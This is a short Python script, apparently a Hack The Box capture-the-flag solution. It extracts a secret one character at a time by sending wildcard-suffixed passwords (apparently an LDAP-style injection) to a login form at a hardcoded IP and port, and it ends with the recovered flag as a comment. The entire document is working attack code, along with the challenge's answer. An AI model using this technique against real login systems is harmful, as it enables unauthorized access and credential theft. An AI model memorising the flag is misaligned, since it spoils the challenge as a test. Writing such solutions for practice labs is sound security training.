import requests
import string

ip = '161.35.36.167:30840'
url = f'http://{ip}/login'
check = f'http://{ip}/'
alphabet = list(string.ascii_lowercase + string.digits + string.punctuation + string.whitespace)
alphabet.remove('*')

data = {
    'username': 'Reese',
    'password': 'anything'
}
result = 'HTB{'
flag = True

while flag:
    for a in alphabet:
        data['password'] = result + a +'*'
        res = requests.post(url, data=data).url
        if res == check:
            result += a
            print(result)
            if a == '}':
                flag = False
            break

print(result)

#HTB{d1rectory_h4xx0r_is_k00l}